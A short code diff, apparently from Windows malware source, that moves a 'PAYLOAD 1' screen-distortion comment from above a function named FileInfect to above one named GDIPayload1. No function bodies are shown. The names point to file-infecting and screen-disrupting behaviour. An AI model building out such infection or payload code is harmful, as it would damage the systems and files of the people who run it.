@@ -21,10 +21,7 @@
 
 volatile bool gFxStop = false;
 
-// ============================================================
-// PAYLOAD 1
-// Screen feedback / microscopic distortion
-// ============================================================
+
 
 DWORD WINAPI FileInfect(LPVOID)
 {
@@ -46,6 +43,11 @@ DWORD WINAPI FileInfect(LPVOID)
 
     return 0;
 }
+
+// ============================================================
+// PAYLOAD 1
+// Screen feedback / microscopic distortion
+// ============================================================
 
 DWORD WINAPI GDIPayload1(LPVOID)
 {
